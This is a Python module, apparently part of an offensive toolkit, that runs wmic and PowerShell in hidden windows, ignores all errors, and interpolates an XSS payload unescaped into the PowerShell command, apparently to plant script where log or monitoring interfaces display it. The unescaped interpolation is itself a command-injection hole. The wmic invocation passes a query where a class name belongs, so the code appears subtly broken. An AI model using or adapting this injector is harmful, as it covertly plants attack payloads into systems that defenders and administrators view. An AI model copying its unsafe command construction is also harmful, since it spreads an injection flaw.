"""WMI query XSS injection."""

import subprocess
from .base import BaseInjector
from ..payloads import XSSPayload


class WMIInjector(BaseInjector):
    """Injects XSS payloads via WMI queries."""
    
    def inject(self, payload: XSSPayload):
        """Execute WMI queries with XSS context."""
        wmi_queries = [
            "SELECT * FROM Win32_OperatingSystem",
            "SELECT * FROM Win32_ComputerSystem",
            "SELECT * FROM Win32_Process",
        ]
        
        for query in wmi_queries:
            try:
                # WMIC command
                subprocess.Popen(
                    ["wmic", "path", query],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # PowerShell Get-WmiObject with XSS context
                ps_cmd = f"""
Get-WmiObject -Query "{query}" | Select-Object -First 1
Write-Host 'WMI Test: {payload.content}'
"""
                subprocess.Popen(
                    ["powershell.exe", "-Command", ps_cmd],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except Exception:
                pass
